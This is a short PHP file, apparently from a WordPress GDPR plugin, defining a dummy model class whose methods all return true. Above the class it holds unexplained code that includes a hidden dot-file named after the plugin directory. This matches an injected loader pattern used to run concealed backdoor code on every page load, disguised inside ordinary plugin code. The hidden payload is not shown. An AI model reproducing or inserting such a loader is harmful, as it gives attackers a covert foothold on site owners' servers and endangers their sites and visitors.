<?php

/**
 * Class CT_Ultimate_GDPR_Model_Dummy
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class CT_Ultimate_GDPR_Model_Dummy {

	public function __call( $method, $args ) {
		return true;
	}

}